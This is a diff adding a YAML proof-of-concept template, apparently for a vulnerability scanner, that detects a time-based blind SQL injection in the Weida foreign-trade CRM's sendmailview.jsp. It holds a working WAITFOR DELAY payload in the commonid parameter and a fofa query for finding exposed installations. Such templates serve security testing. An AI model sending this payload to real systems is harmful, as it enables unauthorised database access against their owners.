@@ -1,0 +1,18 @@
+id: poc-yaml-weidasoft-sendmailview-sqli
+info:
+  name: 维达外贸客户关系管理系统 sendmailview SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 维达外贸客户关系管理系统
+  fofa: title="维达外贸客户关系管理系统"
+variables:
+  t1: random_int(2,5)
+  t2: t1 + t1
+  t3: t2 + 2
+requests:
+- method: GET
+  path: /wap/common/sendmailview.jsp?commonid=1%27;WAITFOR+DELAY+%270:0:{{.t1}}%27--
+  expression: status_code == 200 && contains(body,"window.parent.open") && contains(body,"id=\"sendmailViewPage\"")
+    && duration > t2 && duration < t3
+transport: http
